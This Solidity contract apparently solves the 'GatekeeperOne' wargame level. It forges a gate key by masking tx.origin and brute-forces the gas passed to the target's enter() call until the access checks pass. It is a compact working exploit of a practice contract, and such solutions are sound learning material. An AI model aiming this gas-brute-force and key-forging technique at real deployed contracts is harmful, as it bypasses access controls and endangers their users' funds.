// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface GateKeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Atttack {
    address private target;

    constructor(address addr) {
        target = addr;
    }

    function attack() public {
        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        for (uint256 i = 0; i < 8191; ++i) {
            // target.enter{gas: 8191*3+i}(key); -> will revert!
            (bool success, ) = target.call{gas: 8191*3+i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );

            if (success) {
                break;
            }
        }
    }
}
